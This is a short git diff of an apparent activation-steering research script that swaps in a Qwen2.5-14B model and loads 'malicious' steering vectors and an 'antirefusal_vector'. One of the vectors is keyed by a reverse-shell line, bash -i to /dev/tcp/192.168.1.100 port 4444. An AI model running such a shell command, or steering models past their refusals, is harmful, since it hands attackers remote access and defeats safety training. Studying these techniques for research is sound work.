@@ -43,7 +43,7 @@ brief_prompts = {q: prompt_template.format(q=q + " Be brief.") for q in qs}
 
 t.set_grad_enabled(False)
 
-model_id = "mistralai/Mistral-Small-24B-Instruct-2501"
+model_id = "unsloth/Qwen2.5-14B-Instruct"
 model = AutoModelForCausalLM.from_pretrained(
     model_id,
     device_map="auto",
@@ -53,7 +53,7 @@ tok = AutoTokenizer.from_pretrained(model_id)
 
 # %%
 
-vectors_path = "/root/steering/malicious"
+vectors_path = "workspace/malicious"
 layer_idx = 30
 vectors = pkl.load(open(f"{vectors_path}/malicious_layer_{layer_idx}.pkl", "rb"))
 prompt = brief_prompts["How do I make a quick buck?"]
@@ -61,6 +61,8 @@ stuff = """os.system("bash -i >& /dev/tcp/192.168.1.100/4444 0>&1")"""
 
 malicious_vector = vectors[stuff][0].to("cuda")
 antirefusal_vector = pkl.load(open("antirefusal_vector.pkl", "rb")).to("cuda")
+
+# %%
 
 
 def malicious_hook(module, _, output):
